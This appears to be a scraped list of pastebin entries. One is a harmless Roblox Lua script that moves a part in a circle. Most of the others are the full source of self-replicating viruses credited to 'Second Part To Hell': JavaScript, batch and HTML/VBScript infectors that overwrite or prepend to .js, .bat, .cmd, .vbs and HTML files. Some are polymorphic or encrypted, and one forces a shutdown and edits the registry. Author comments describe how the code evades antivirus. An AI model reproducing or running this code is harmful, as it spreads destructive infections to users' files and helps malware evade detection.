8RgysHGz,Unit Circle,oopsrainbow4,Lua,Monday 3rd of July 2023 01:37:21 AM CDT,"Put it in part

local part = script.Parent
local RunService = game:GetService(""RunService"")

local degree = 0

while RunService.Heartbeat:Wait() do
	degree += 1
	
	local x = 10 * math.cos(math.rad(degree))
	local y = 10 * math.sin(math.rad(degree)) + 11 -- How high you want?
	local z = 1 -- To stay here 
 
    or
 
    [ local z = degree/10 ] -- To move forward
	
	part.Position = Vector3.new(x, y, z)
end"
xuz8Eaif,Virus.JS.Sinope - Source Code,FlyFar,JavaScript,Monday 3rd of July 2023 01:34:43 AM CDT,"Sinope()
function Sinope() {
var fso=WScript.CreateObject('Scripting.FileSystemObject')
var shell=WScript.CreateObject('WScript.Shell')
big=String.fromCharCode(62);
small=String.fromCharCode(60);
comma=String.fromCharCode(34);
percent=String.fromCharCode(37);
nl=String.fromCharCode(13)+String.fromCharCode(10);
myfile=fso.OpenTextFile(WScript.ScriptFullName); mycode='';
eval('for (i=0; i'+small+'500; i++) { code=myfile.ReadLine(); if (code=='+comma+'function Sinope() {'+comma+') { for (j=1; j'+small+'40; j++) { mycode+=code+nl; code=myfile.ReadLine(); i=666; } } }')
sino=fso.CreateTextFile('sinope.tmp').Write(mycode)
bat=fso.CreateTextFile('sinope.bat')
bat.WriteLine('cls'+nl+'@echo off'+nl+'echo Sinope()'+big+'javascript.js')
my=fso.OpenTextFile('sinope.tmp')
eval('for (i=0; i'+small+'1; i++) { mlc=my.ReadLine(); if (mlc!='+comma+'// End'+comma+') { i--; bat.WriteLine('+comma+'echo '+comma+'+mlc+big+big+'+comma+' javascript.js'+comma+'); } }')
bat.WriteLine('echo // End'+big+big+'javascript.js'+nl+'echo.'+big+big+'javascript.js'+nl+'echo.'+big+big+'javascript.js'+nl+'cscript javascript.js')
bat.Close(); my.Close();
vbsfile=fso.CreateTextFile('sinope.vbs')
vbsfile.WriteLine('set fso=WScript.CreateObject('+comma+'Scripting.FileSystemObject'+comma+')'+nl+'set shell=WScript.CreateObject('+comma+'WScript.Shell'+comma+')'+nl+'set a=fso.CreateTextFile('+comma+'javas.js'+comma+')'+nl+'a.WriteLine'+comma+'Sinope()'+comma)
my=fso.OpenTextFile('sinope.tmp')
eval('for (i=0; i'+small+'1; i++) { mlc=my.ReadLine(); if (mlc!='+comma+'// End'+comma+') { i--; vbsinclude(mlc) } }')
vbsfile.WriteLine('a.WriteLine '+comma+'// End'+comma+'+chr(13)+chr(10)+chr(13)+chr(10)+chr(13)+chr(10)'+nl+'a.Close'+nl+'shell.Run'+comma+'javas.js'+comma)
infsearch=fso.CreateTextFile('search.bat')
infsearch.WriteLine('cls'+nl+'@echo off'+nl+'assoc .cmd'+nl+'if errorlevel 1 goto bat'+nl+'for /r C:\ '+percent+percent+'a in (*.bat) do copy sinope.bat '+percent+percent+'a'+nl+'for /r C:\ '+percent+percent+'b in (*.cmd) do copy sinope.bat '+percent+percent+'b'+nl+'for /r C:\ '+percent+percent+'c in (*.vbs) do copy sinope.vbs '+percent+percent+'c'+nl+'echo.'+big+'js.lst'+nl+'for /r C:\ '+percent+percent+'d in (*.js) do echo '+percent+percent+'d '+big+big+'js.lst'+nl+'echo end'+big+big+'js.lst'+nl+'goto :EOF'+nl+':bat')
infsearch.Close(); my.Close();
shell.Run('search.bat')
eval('for (i=0; i'+small+'3000000; i++) { i--; i++; }') 
javf=fso.OpenTextFile('js.lst')
eval('for (i=0; i'+small+'1; i++) { javline=javf.ReadLine(); if (javline!='+comma+'end'+comma+') { i--; if (fso.FileExists(javline)) { infjs(javline) } } }') }
function vbsinclude(mlc) {
vbsfile.WriteLine('a.WriteLine'+comma+mlc+comma) }
function infjs(victimname) { 
var fso=WScript.CreateObject('Scripting.FileSystemObject'); var vicall=fso.OpenTextFile(victimname).ReadAll()
var victim=fso.OpenTextFile(victimname)
var vcode=''; var viccodes=''; vsearch='FUNCTION';
eval('for (i=0; i'+small+'vicall.length; i++) { vcode=victim.Read(1);'+nl+'if (vcode.toUpperCase()=='+comma+'F'+comma+') { for (j=1; j'+small+'8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } }'+nl+'if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }'+nl+'if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode } }')
virinc=fso.OpenTextFile(victimname, 2).Write('Sinope()'+nl+viccodes+nl+mycode+nl+'function'+victim.ReadAll()); victim.Close();
}
// End"
ZrvY8aE4,Virus.WinXP.BAT.Saturn - Source Code,FlyFar,Batch,Monday 3rd of July 2023 01:32:45 AM CDT,"cls%SpTh%
@echo off%SpTh%
ReM	----------- BatXP.Saturn ********** by Second Part To Hell -----------    %SpTh%
ReM										| %SpTh%
ReM	I think, you are looking at the code and think: ""What the hell is this?""| %SpTh%
ReM	The answer is: A Windows XP Batch polymorph virus :D			| %SpTh%
ReM	WinXP is using a program named CMD.EXE instate of COMMAND.COM for DOS	| %SpTh%
ReM	You're able to make the really nice things with CMD which you wasn't 	| %SpTh%
ReM	able to do it with COMMAND.COM.						| %SpTh%
ReM										| %SpTh%
ReM	Information about the virus:						| %SpTh%
ReM	Virusname......................: BatXP.Saturn				| %SpTh%
ReM	Virusauthor....................: Second Part To Hell			| %SpTh%
ReM	Size...........................: The poly-engine has 1.301 Bytes	| %SpTh%
ReM					 The whole virus has 4.158 Bytes	| %SpTh%
ReM	Encrypted......................: Yes, but only the virus part. 		| %SpTh%
ReM					 I'll crypt also the poly engine in	| %SpTh%
ReM					 next versions.				| %SpTh%
ReM	Polymorphic....................: Yes					| %SpTh%
ReM										| %SpTh%
ReM	written from 20.11.2002 to 22.11.2002					| %SpTh%
ReM	in Austria								| %SpTh%
ReM     ----------------------------------------------------------------------	  %SpTh%
set a=0%SpTh%
set aa=0%SpTh%
set bb=0%SpTh%
set cc=0%SpTh%
set dd=0%SpTh%
set ee=0%SpTh%
set ff=0%SpTh%
set gg=0%SpTh%
find ""SpTh""<%0 >spth.bat
set sec=A%SpTh%
:TitanMoon	%SpTh%
if %aa% EQU 1 (if %bb% EQU 1 (if %cc% EQU 1 (if %dd% EQU 1 (if %ee% EQU 1 (goto saturn)))))%SpTh%
call :RheaMoon%SpTh%
if %aa% EQU 0 (if %a% EQU 45 (%SpTh%
find ""%Sec%aAa"" <%0 >>spth.bat%SpTh%
set aa=1))%SpTh%
if %bb% EQU 0 (if %a% EQU 46 (%SpTh%
find ""%sec%bBb"" <%0 >>spth.bat%SpTh%
set bb=1))%SpTh%
if %cc% EQU 0 (if %a% EQU 47 (%SpTh%
find ""%sec%cCc"" <%0 >>spth.bat%SpTh%
set cc=1))%SpTh%
if %dd% EQU 0 (if %a% EQU 48 (%SpTh%
find ""%sec%dDd"" <%0 >>spth.bat%SpTh%
set dd=1))%SpTh%
if %ee% EQU 0 (if %a% EQU 49 (%SpTh%
find ""%sec%eEe"" <%0 >>spth.bat%SpTh%
set ee=1))%SpTh%
goto TitanMoon%SpTh%
:RheaMoon 	%SpTh%
set a=%random%%SpTh%
:IapetusMoon	%SpTh%
if %a% GEQ 50 (set /A a=%a%/2)%SpTh%
if %a% LEQ 45 (set /A a=%a%+5)%SpTh%
if %a% LSS 45 (goto :IapetusMoon)%SpTh%
if %a% GTR 50 (goto :IapetusMoon)%SpTh%
goto :EOF	%SpTh%
:saturn  %SpTh%
if %ply% GTR 16383 (%SpTh%
find ""%sec%sat""<%0 >>spth.bat  %SpTh%
find ""%sec%tas""<%0 >>spth.bat  %SpTh%
) ELSE (  %SpTh%
find ""%sec%tas""<%0 >>spth.bat  %SpTh%
find ""%sec%sat""<%0 >>spth.bat  %SpTh%
)  %SpTh%
set !!.!!=h%AdDd%
set !!.!!=i%AdDd%
goto !!.!!	%AdDd%
set !!.!!=w%AdDd%
:!!.!!		%AdDd%
:!.!..		%AdDd%
set !..!!=b%AdDd%
set !..!!=y%AdDd%
goto !..!!	%AdDd%
set !..!!=w%AdDd%
:!..!!		%AdDd%
set !!!.!=q%AcCc%
set !!!.!=o%AcCc%
goto !!!.!	%AcCc%
set !!!.!=u%AcCc%
:!!!.!		%AcCc%
set !!.!.=j%AcCc%
set !!.!.=n%AcCc%
goto !!.!.	%AcCc%
set !!.!.=l%AcCc%
:!!.!.		%AcCc%
set !.!.!=b%AbBb%
set !.!.!=y%AbBb%
goto !.!.!	%AbBb%
set !.!.!=w%AbBb%
:!.!.!		%AbBb%
set !..!.=p%AbBb%
set !..!.=s%AbBb%
goto !..!.	%AbBb%
set !..!.=o%AbBb%
:!..!.		%AbBb%
set !!..!=f%AeEe%
set !!..!=d%AeEe%
goto !!..!	%AeEe%
set !!..!=b%AeEe%
:!!..!		%AeEe%
set !.!!.=w%AeEe%
set !.!!.=p%AeEe%
goto !.!!.	%AeEe%
set !.!!.=d%AeEe%
:!.!!.		%AeEe%
set !.!..=b%AeEe%
set !.!..=e%AeEe%
goto !.!..	%AeEe%
set !.!..=w%AeEe%
set !!!!.=t%AaAa%
set !!!!.=f%AaAa%
goto !!!!.	%AaAa%
set !!!!.=k%AaAa%
:!!!!.		%AaAa%
set !!!..=v%AaAa%
set !!!..=r%AaAa%
goto !!!..	%AaAa%
set !!!..=u%AaAa%
:!!!..		%AaAa%
set !.!!!=p%AaAa%
set !.!!!=c%AaAa%
goto !.!!!	%AaAa%
set !.!!!=q%AaAa%
:!.!!!		%AaAa%
%!.!!!%%!!!.!%%!.!!.%%!.!.!% spth.bat C:\mirc\saturn.bat %Asat%
%!.!..%%!.!!!%h%!!!.!% [%!..!.%%!.!!!%%!!!..%%!!.!!%%!.!!.%t] >C:\mirc\script.ini %Asat%
%!.!..%%!.!!!%h%!!!.!% %!!.!.%0=%!!!.!%n 1:j%!!!.!%%!!.!!%%!!.!.%:*.* { %!!.!!%%!!!!.% ( $n%!!.!!%%!.!!!%k ==$m%!.!..% )  {halt} /d%!.!!!%%!.!!!% %!..!.%%!.!..%%!!.!.%d $n%!!.!!%%!.!!!%k C:\mirc\saturn.bat } >>C:\mirc\script.ini %Asat%
%!!!!.%%!!!.!%%!!!..% %%q %!!.!!%%!!.!.% (%windir%\*.bat) %!!..!%%!!!.!% %!.!!!%%!!!.!%%!.!!.%%!.!.!% spth.bat %%q %Atas%"
qswKYMxC,Virus.JS.Cassandra.b - Source Code,FlyFar,JavaScript,Monday 3rd of July 2023 01:29:24 AM CDT,"/*  JS.Cassandra.b
  by Second Part To Hell[rRlf]
  www.spth.de.vu
  spth@aonmail.at
  written in 2003 and finished 2004
  Austria

  This is, as you may imagine, the second version of JS.Cassandra. It is a five-times
  polymorphic and sometimes encrypt JavaScript Overwriter. As you can see, the code is
  very complex (it has about 5kB). Well, now let's talk about the technique:
  --> Polymorphism engine I: Permutation
      The virus splits the whole file into chr(10,13) and but the parts randomly together.
      This technique allows 14! variants at the first generation. (Due to the randomness
      of the virus there are much more variants after some generations)
  --> Polymorphism engine II: Function Games
      The virus searchs for a '{' and 1/4 it makes a new function with the code between the
      '{' and the '}', and calls the new function.
  --> Polymorphism engine III: Add garbage code
      The virus spits the whole code into chr(10,13), than 1/2 it includes random garbage code
      after a line to the code. The garbage code don't do anything.

  --> Polymorphism engine IV: Variable/Function name Changing
      The virus changes 27 variable or function names, which makes the code look very different.
      The new variable-name has a size of 6-21 letters. The engine's size could be much smaller,
      but due to the other polymorphism engines it wasn't possible to make it as small as possible.

  --> Polymorphism engine V: Number Changine
      At execution the virus searchs for a number (chr(48-57)) and 1/6 changes the number to a full
      calculation like:
      (1+9)=10
      (13-3)=10
      (80/8)=10
      In combination with the encryption this polymorphism engine is very successful.

  --> Encryption engine:
      The virus changes the whole code to ASCII-code. And execute it via 'eval' after retransform it
      to real code via 'String.fromCharCode'. This is, in my opinion a very successful way to fake
      AVs. In compination with the Number Changine-Polymorphism-Engine it's much more successful
      than alone.
  Thanks goes to jackie for his JS.Opitz, which was the first JS-virus. I used some parts of it for
  the file-finding in this virus.
  End-Notes:
  It is very doubtful that I will write any other script-viruses anymore. As you can see, scripts don't
  have any big secrets for me. Hey, this is a five-times polymorph, sometimes encrypted and very complex
  JavaScript virus. What else shall I make? Well, it was fun writing this, but no real challenge. Therefor
  I will close now with the following words: 'byebye, scripts!'...

--------------------------------------------<([{  JS.Cassandra.b  }])>--------------------------------------------   /*
 cassandra()
function cassandra(){nextln=String.fromCharCode(13,10);code=varsd(2).OpenTextFile(varsd(1)).ReadAll();if(code.charAt(0)=='e'&&Math.round(Math.random()*3)==1){decryption()}if(code.charAt(0)!='e'){if(Math.round(Math.random()*3)==1){bodychange()}if(Math.round(Math.random()*2)==1){funcgame()}if(Math.round(Math.random()*2)==1){trash()}if(Math.round(Math.random()*2)==1){varchange()}}if(Math.round(Math.random()*14)==1){encryption()}numberchange()}
function varsd(varnum){ if(varnum==1){check=String.fromCharCode(87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101)}if(varnum==2){check=String.fromCharCode(87,83,99,114,105,112,116,46,67,114,101,97,116,101,79,98,106,101,99,116,40,39,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,39,41,59,32)}return(eval(check))}
function funcgame(){code='';count=0;fcodn='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();for(i=0;i<file.length;i++){check=0;if(file.charCodeAt(i)==123&&Math.round(Math.random()*3)==1){if(file.charCodeAt(i+1)!=32){foundit();check=1;}}if(!check){code+=file.charAt(i)}}varsd(2).OpenTextFile(varsd(1),2).Write(code+fcodn)}
function foundit(){fcoda='';count=0;randon='';for(j=i;j<file.length;j++){if(file.charCodeAt(j)==123){count++}if(file.charCodeAt(j)==125){count--}if(!count){fcoda=file.substring(i+1,j);j=file.length}}for(j=0;j<Math.round(Math.random()*5)+4;j++){randon+=String.fromCharCode(Math.round(Math.random()*25)+97)}fcodn+=nextln+'function '+randon+'()'+String.fromCharCode(123)+fcoda+String.fromCharCode(125);code+=String.fromCharCode(123)+' '+randon+'()';i+=fcoda.length}
function trash(){code='';cote=varsd(2).OpenTextFile(varsd(1)).ReadAll().split(String.fromCharCode(13,10));file=varsd(2).OpenTextFile(varsd(1));for(i=0;i<cote.length;i++){if(cote[i].charAt(0)!='/'&&cote[i].charAt(0)!='v'&&cote[i].charAt(0)!='i'&&cote[i].substring(0,2)!='fo'){code+=cote[i]+nextln}trasname();nameb=namea;trasname();check=Math.round(Math.random()*8);if(check==1){code+='var '+namea+'='+String.fromCharCode(39)+nameb+String.fromCharCode(39)+nextln}if(check==1){code+='// '+namea+nextln}if(check==2){code+='var '+namea+'='+Math.round(Math.random()*9999999)+nextln}if(check==3){code+='if('+Math.round(Math.random()*9999)+'=='+Math.round(Math.random()*9999)+')'+String.fromCharCode(123)+namea+'()'+String.fromCharCode(125)+nextln}if(check==4){code+='for('+namea+'=0;'+namea+'>'+Math.round(Math.random()*9999)+';'+namea+'++)'+String.fromCharCode(123)+nameb+'()'+String.fromCharCode(125)+nextln}}file=varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function trasname(){namea='';for(j=0;j<Math.round(Math.random()*15)+5;j++){namea+=String.fromCharCode(Math.round(Math.random()*25)+97)}}
function numberchange(){code='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();for(i=0;i<file.length;i++){if(file.charCodeAt(i)>47&&file.charCodeAt(i)<58){findfullnumber()}else{code+=file.charAt(i)}}varsd(2).OpenTextFile(varsd(1),2).Write(code);infectit()}
function findfullnumber(){numbber='';for(j=i;j<file.length;j++){if(file.charCodeAt(j)>47&&file.charCodeAt(j)<58){numbber+=file.charAt(j)}else{j=file.length}}if(Math.round(Math.random()*6)==1){random=Math.round(Math.random()*2);randon=Math.round(Math.random()*10)+1;if(random==0){code+='('+(numbber-randon)+'+'+randon+')'}if(random==1){code+='('+(numbber/1+randon)+'-'+randon+')'}if(random==2){code+='('+(numbber*randon)+'/'+randon+')'}}else{code+=numbber}i+=numbber.length-1}
function infectit(){infdir=varsd(2).GetFolder(varsd(2).GetFolder('.'));inffil=new Enumerator(infdir.Files);for(;!inffil.atEnd();inffil.moveNext()){if(varsd(2).GetExtensionName(inffil.item()).toUpperCase()=='JS'&&inffil.item()!=varsd(1)){varsd(2).OpenTextFile(inffil.item(),2).Write(code)}}}
function bodychange(){file=varsd(2).OpenTextFile(varsd(1)).ReadAll().split(String.fromCharCode(13,10));code=file.splice(0,1)+nextln;for(;file.length>0;){code+=file.splice(Math.round(Math.random()*file.length),1)+nextln;}varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function varchange(){code=varsd(2).OpenTextFile(varsd(1)).ReadAll();cvar=new Array('bodychange','cassandra','check','code','cote','count','decryption','encryption','fcoda','fcodn','file','findfullnumber','foundit','funcgame','infectit','infdir','inffil','namea','nameb','nextln','numberchange','randon','trash','trasname','varchange','varnum','varsd');for(i=0;i<cvar.length;i++){trasname();for(j=0;j<code.length;j++){code=code.replace(cvar[i],namea);if(code.indexOf(cvar[i])==-1){j=code.length;}}}varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function encryption(){file=varsd(2).OpenTextFile(varsd(1)).ReadAll();code='eval(String.fromCharCode('+file.charCodeAt(0);for(i=1;i<file.length;i++){code+=','+file.charCodeAt(i)}code+='))';varsd(2).OpenTextFile(varsd(1),2).Write(code)}
function decryption(){code='';file=varsd(2).OpenTextFile(varsd(1)).ReadAll();file=file.substring(25,file.length-2);file=file.split(',');for(i=0;i<file.length;i++){code+=String.fromCharCode(eval(file[i]))}varsd(2).OpenTextFile(varsd(1),2).Write(code)}
"
jFq61wjS,Virus.WinXP.HTML.Umbriel - Source Code,FlyFar,HTML,Monday 3rd of July 2023 01:28:12 AM CDT,"  <html><!--Umbriel-->
<head>
<title> Second Part To Hell's HTML.Umbriel </title>
</head>
<body>
<script language=""VBScript"">
rem VBS
On Error Resume Next
Dim fso, shell, wrte, tempdir, windir, rand, file
Set fso=CreateObject(""Scripting.FileSystemObject"")
Set shell=CreateObject(""Wscript.Shell"")
if err.number=429 Then
  shell.Run javascript:location.reload()
End If

Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+""\windows.cmd"")
wrte.WriteLine ""cls""
wrte.WriteLine ""@echo off""
wrte.WriteLine ""shutdown -s -f -t 300 -c ""+chr(34)+""Second Part To Hell's Umbriel has you...""+chr(34)
wrte.Close()

shell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\Source"", ""C:\umbriel.html""
shell.RegWrite ""HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\SubscribedURL"", ""C:\umbriel.html""

Randomize
rand=int(rnd*5)+1
If rand=1 then
  shell.Run windir+""\windows.cmd""
End If
</script>

<script language=""JavaScript"">
// JS
var viruspath, virus, code, fso, file, check, checka, checkb
fso=new ActiveXObject(""Scripting.FileSystemObject"")
viruspath=window.location.pathname
viruspath=viruspath.slice(1)
virus=fso.OpenTextFile(viruspath,1)
file=fso.CreateTextFile(""C:\\umbriel.html"")
for (i=0; i<500; i++)
{
  if (checkb!=1)
  {
    if (Math.round(Math.random()*5)+1 == 3) 
    {
      if (check == 2)
      {
        file.WriteLine(""/""+""*"")
        file.WriteLine(""*""+""/"")
      }
      if (check == 3)
      {
        file.WriteLine(""rem"")
      }
    }
    code=virus.ReadLine()
    if (code == ""/""+""*"") { checka=666 }
    if (code == ""*""+""/"") { checka=666 }
    if (code == ""rem"") { checka=666 }
    if (checka != 666 ) { file.WriteLine(code) }
    checka=0
    if (code==""</""+unescape(""%68"")+""tml>"") { checkb=1 }
    if (code==""// JS"") { check=2 }
    if (code==""rem VBS"") { check=3 }
    if (code==""</""+unescape(""%73"")+""cript>"") { check=0 }
  }
}
virus.Close();
file.Close();
</script>

<script language=""VBScript"">
rem VBS
On Error Resume Next
set fso=CreateObject(""Scripting.FileSystemObject"")
set shell=CreateObject(""WScript.Shell"")
set myfile=fso.OpenTextFile(""C:\umbriel.html"")
mycode=myfile.ReadAll
myfile.Close()
rr=shell.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File1"")
if rr <> """" Then Call Umbriel(rr, mycode)
rr=shell.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File2"")
if rr <> """" Then Call Umbriel(rr, mycode)
rr=shell.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File3"")
if rr <> """" Then Call Umbriel(rr, mycode)
rr=shell.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File4"")
if rr <> """" Then Call Umbriel(rr, mycode)
rr=shell.RegRead(""HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File5"")
if rr <> """" Then Call Umbriel(rr, mycode)

Sub Umbriel(rr, mycode)
set victim=fso.OpenTextFile(rr)
infcheck=victim.ReadLine
If infcheck<>""<html><!--Umbriel-->"" Then
  viccode=victim.ReadAll
  victim.Close()
  set wrtevic=fso.OpenTextFile(rr, 2, false, 0)
  wrtevic.Write (mycode+infcheck+chr(13)+chr(10)+viccode)
  wrtevic.Close
End If

End Sub
</script>
</body>
</html>"
QnmGWw3T,Virus.BAT.Lorelei - Source Code,FlyFar,Batch,Monday 3rd of July 2023 01:23:24 AM CDT,":: BAT.Lorelei
::  by Second Part To Hell[rRlf]
::  www.spth.de.vu
::  spth@aonmail.at
::  written on 25.07.2003
::  in Austria
::
::  In my opinion, this is no real virus, but a new, never seen engine.
::  It searches in the next 3 directories for bat files. It searches the directory names
::  in a brute-force way. That's also the reason, why it needs very long to run (about 45sec
::  at my 1.400MHz). Now let me show you, what I mean:
::  ---
::  C:\asterix\obelix\idefix\roma
::            \zzz
::    \windows\system\...
::    \programs
::  ---
::  It will infect every .BAT file in the directories (C:\*.* | C:\asterix\*.* | C:\asterix\obelix\*.* |
::  C:\asterix\obelix\idefix\*.*). The engine isn't perfect now, but I don't want to work on it anymore.
::  But a perfect version of that would be the same as the command 'for /r C: ...' in Win00|XP|NT.
::  Unfortunately, I had no time to test it at Win 9x, but at WinXP it works fine, so I guess, it should also
::  work on Win9x, because I didn't use any special commands.
::  One other thing is the 'goto %BackJmpLable%'. You are able to do cool things with that. And you're also
::  able to short your codes a lot.
::
::  OK, I think, that's everything. I wish you fun while you are trying to understand this :)
::
::
:: --------------------------------------< BAT.Lorelei >--------------------------------------
cls
@echo off
set saveA=Lorelei
set saveB=Lorelei
set saveC=Lorelei
set buffer=Loro
:Again
set counter=%counter%!
if %counter%==!!! exit
set count=Lorelei
set StageA=StageA
set StageB=StageB
set StageC=StageC
set exspth=exspth
:GetRoot
cd..
set GRcheck=%GRcheck%x
if %GRcheck%==xxxxxxxx goto GotRoot
goto GetRoot
:GotRoot
set GRcheck=
C:
set spth=C:\
set Oldspth=%spth%
set BackJmpLable=DirCheck
goto infect

:DirCheck
dir %spth%* >C:\Lorelei
find ""<DIR>"" C:\Lorelei>trash
set ThOfTr=a
if %spth%==%exspth% set ThOfTr=gothic
if NOT ERRORLEVEL 1 set BackJmpLable=SetDirCheck
if NOT ERRORLEVEL 1 set Oldspth=%spth%
if NOT ERRORLEVEL 1 goto AddNewLetter
set spth=%Oldspth%
goto DirCheck

:SetDirCheck
cd %spth%>trash
if NOT ERRORLEVEL 1 set BackJmpLable=SDCfinish
if NOT ERRORLEVEL 1 goto infect
goto DirCheck

:SDCfinish
if %spth%==%saveA% set ThOfTr=e
if %spth%==%saveB% set ThOfTr=e
if %spth%==%saveC% set ThOfTr=e
if %ThOfTr%==e set spth=%Oldspth%
if %ThOfTr%==e goto DirCheck
set SDCvar=SDCvar
if NOT %StageA%==Lorelei set SDCvar=1
if %SDCvar%==1 set StageA=Lorelei
if %SDCvar%==1 goto Savevar
if NOT %StageB%==Lorelei set SDCvar=2
if %SDCvar%==2 set StageB=Lorelei
if %SDCvar%==2 goto Savevar
if NOT %StageC%==Lorelei set SDCvar=3
if %SDCvar%==3 set StageC=Lorelei
if %SDCvar%==3 goto SaveVar
exit


:AddNewLetter
set ThOfTr=a
set AddNewLetterVar=%AddNewLetterVar%y
if %AddNewLetterVar%==y if %exspth%==%spth% if %count%==! goto Again
if %AddNewLetterVar%==y if %exspth%==%spth% set count=!
if %AddNewLetterVar%==y set exspth=%spth%
if %AddNewLetterVar%==y set spth=%spth%a
if %AddNewLetterVar%==yy set spth=%spth%b
if %AddNewLetterVar%==yyy set spth=%spth%c
if %AddNewLetterVar%==yyyy set spth=%spth%d
if %AddNewLetterVar%==yyyyy set spth=%spth%e
if %AddNewLetterVar%==yyyyyy set spth=%spth%f
if %AddNewLetterVar%==yyyyyyy set spth=%spth%g
if %AddNewLetterVar%==yyyyyyyy set spth=%spth%h
if %AddNewLetterVar%==yyyyyyyyy set spth=%spth%i
if %AddNewLetterVar%==yyyyyyyyyy set spth=%spth%j
if %AddNewLetterVar%==yyyyyyyyyyy set spth=%spth%k
if %AddNewLetterVar%==yyyyyyyyyyyy set spth=%spth%l
if %AddNewLetterVar%==yyyyyyyyyyyyy set spth=%spth%m
if %AddNewLetterVar%==yyyyyyyyyyyyyy set spth=%spth%n
if %AddNewLetterVar%==yyyyyyyyyyyyyyy set spth=%spth%o
if %AddNewLetterVar%==yyyyyyyyyyyyyyyy set spth=%spth%p
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyy set spth=%spth%q
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyy set spth=%spth%r
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyy set spth=%spth%s
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyy set spth=%spth%t
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyy set spth=%spth%u
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyy set spth=%spth%v
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%w
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%x
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%y
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set spth=%spth%z
if %AddNewLetterVar%==yyyyyyyyyyyyyyyyyyyyyyyyyy set AddNewLetterVar=
goto %BackJmpLable%

:SaveVar
set spth=%spth%\
goto DirCheck


:infect
for %%a in (*.bat) do copy %0 %%a
goto %BackJmpLable%"
rMbb0fca,Virus.WinXP.Bat.Nihilist - Source Code,FlyFar,Batch,Monday 3rd of July 2023 01:20:34 AM CDT,"%  BatXP.Nihilist
%  by Second Part To Hell[rRlf]
%  www.spth.de.vu
%  spth@priest.com
%  written in March 2004
%  in Austria
%
%  BatXP.Nihilist is the very first Entry Point Obscuring (EPO) Batch virus
%  ever done. EPO was the last very important and not yet done technique until
%  March 2004. And as you may imagine, it's done now. :).
%
%  I got the idea in writing it long time before, because I thought that every
%  language should have at least one encrypted, one polymorph and one EPO virus.
%  But unfortunatly I forgot the idea, and just picked it up again in 2004, when
%  I read DvL's editional of Batch Zone#4. Much thanks! :)
%
%  The code uses some interesting commands, and it's doubtful that you will understand
%  the whole thing without testing the commands or read Microsoft's help (command /?) :D.
%
%  That's more or less everything I want to say. I don't want to explain everything because
%  everybody who is interested in that will understand it. If not, just send me a mail!
%
%  The History of the name is little strange: I asked my girlfriend if she knows any cool
%  word. She sent me a SMS: 'Nihilist'. Well, First I wanted to use it for my PE vir, then
%  for my MenuetOS vir, but both aren't finished so far and I want to use this name for a
%  virus :). Much thanks for the cool name, ILD!
%
%
%--------------------------------------------<([{  BatXP.Nihilist  }])>--------------------------------------------
%Nihilist%@echo off
%Nihilist%set num=0
:ag	%Nihilist%
%Nihilist%set fn%num%=
%Nihilist%set /a num+=1
%Nihilist%if %num% LSS 5 goto ag
%Nihilist%set num=0
%Nihilist%for %%a in (*.bat *.cmd) do call :mr %%a
%Nihilist%set num=-1
:fi	%Nihilist%
%Nihilist%set /a num+=1
%Nihilist%if %num% GTR 5 (goto ROF)
%Nihilist%if %num% EQU 0 (set file=%fn0%)
%Nihilist%if %num% EQU 1 (set file=%fn1%)
%Nihilist%if %num% EQU 2 (set file=%fn2%)
%Nihilist%if %num% EQU 3 (set file=%fn3%)
%Nihilist%if %num% EQU 4 (set file=%fn4%)
%Nihilist%if %num% EQU 5 (set file=%fn5%)
%Nihilist%set rnd=%random%
%Nihilist%set spth=%0
:findnum	%Nihilist%
%Nihilist%set /a rnd-=10
%Nihilist%if %rnd% GEQ 10 (goto findnum)
%Nihilist%set lz=0
%Nihilist%del tmp
%Nihilist%for /f ""tokens=1*"" %%a in (%file%) do if 1 EQU 1 (
%Nihilist%  set lc=%%a %%b
%Nihilist%  call :wl
%Nihilist%)
find ""Nihilist"" <%spth% >>tmp
%Nihilist%more +%rnd% < %file% >>tmp
%Nihilist%move /y tmp %file%
%Nihilist%@echo on
%Nihilist%goto fi
:wl	%Nihilist%
%Nihilist%set /a lz=%lz%+1
%Nihilist%if %lz% LEQ %rnd% (echo %lc% >>tmp)
%Nihilist%goto :EOF
:mr	%Nihilist%
%Nihilist%if %num% LEQ 5 (
%Nihilist%set fn%num%=%1
%Nihilist%set /a num+=1
%Nihilist%)
:ROF	%Nihilist%"
xXHpj1GS,Virus.Matlab.MicrophoneFever2 - Source Code,FlyFar,MatLab,Monday 3rd of July 2023 01:14:37 AM CDT,"
  Matlab.MicrophoneFever2
  by SPTH
  www.spth.de.vu

